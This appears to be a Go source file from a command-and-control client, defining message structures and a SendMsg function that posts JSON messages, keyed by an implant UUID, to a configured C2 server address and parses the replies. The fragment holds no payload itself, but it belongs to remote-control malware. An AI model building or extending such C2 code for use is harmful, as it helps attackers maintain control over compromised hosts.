package cmd

import (
	"c2_client_go/config"
	"c2_client_go/http"
	"encoding/json"
)

type MsgInfo struct {
	//Id         string `json:"id"`
	Uuid string `json:"uuid"` //uuid唯一标识
	//Ip         string `json:"ip"`         //上线ip
	Msgtype string `json:"msgtype"`
	Msg     string `json:"msg"`
	Msgid   string `json:"msgid"`
}
type RetMsg struct { //返回包的结构体
	Status  int    `json:"status"`
	Uuid    string `json:"uuid"` //uuid唯一标识
	Msgtype string `json:"msgtype"`
	Msg     string `json:"msg"`   //返回的详细
	Msgid   string `json:"msgid"` //信息id
}

func SendMsg(uuid string, cmdtype string, msgtype string, msg string, msgid string) (RetMsg, int) {
	msgstr := MsgInfo{Uuid: uuid, Msgtype: msgtype, Msg: msg,Msgid: msgid}
	buf, _ := json.Marshal(msgstr)
	a, c := http.PostData(config.HostAddress+cmdtype, string(buf),uuid)
	jsonstr := RetMsg{}
	//fmt.Println(a)
	json.Unmarshal([]byte(a), &jsonstr)
	if jsonstr.Status == 200 {
		return jsonstr, c
	} else {
		return jsonstr, c
	}
}
